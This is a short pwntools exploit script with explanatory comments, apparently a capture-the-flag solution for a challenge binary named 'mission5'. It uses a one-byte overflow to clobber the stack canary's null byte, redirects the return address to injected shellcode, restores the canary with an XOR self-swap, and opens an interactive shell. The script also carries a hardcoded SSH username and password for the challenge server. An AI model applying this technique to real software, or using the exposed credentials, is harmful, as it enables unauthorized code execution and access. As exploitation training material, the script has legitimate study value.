from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission5"
REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
PASSWORD = "unixporn"
USER  = "m226002"


if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        b* 0x400ed9
        b* 0x400f01
        c
        """)
    input("wait")

#code 
timesleep = 0.3
r.sendline(b"10")
r.send(b"A"*41)
sleep(timesleep)
r.recvuntil(b">")
r.sendline(b"40")
sleep(timesleep)
r.sendline(b"40")
sleep(timesleep)

r.interactive() 


# it was funny. In this challenge a "signature" is appended to a message I insert just
# after two symbols "\t\n". This causes a stacksmash because the signature overrides
# the canary. If you read the documentation of strcat it says that from the destination
# it searches for a "\x00" byte and then it append the given string overriding the "\x00". 
# So, beacuse the canary always ends with 0x00 and there was a buffer (len 40) overflow in the read,
# I read 41 "A" overriding the \x00, leading the strcat to not override the canary and appending
# the signature in the return address. By looking at the signatures I discoverd that one 
# of them (number 10) has a byte string similar to the addr 0x2121733000 , that is the 
# address where a shellcode is allocated with some nops (it is done in the gift function). 

# So, basically I override the return addr with the signature 10, but I need to recover 
# the first byte of the canary 0x00 overridden with the \x41 (A). If you look at the 
# swap function you see it is made with a xor, so If you swipe the same char the result is a 0x00

# I at the end asked for swapping char 40 and char 40, and the code works.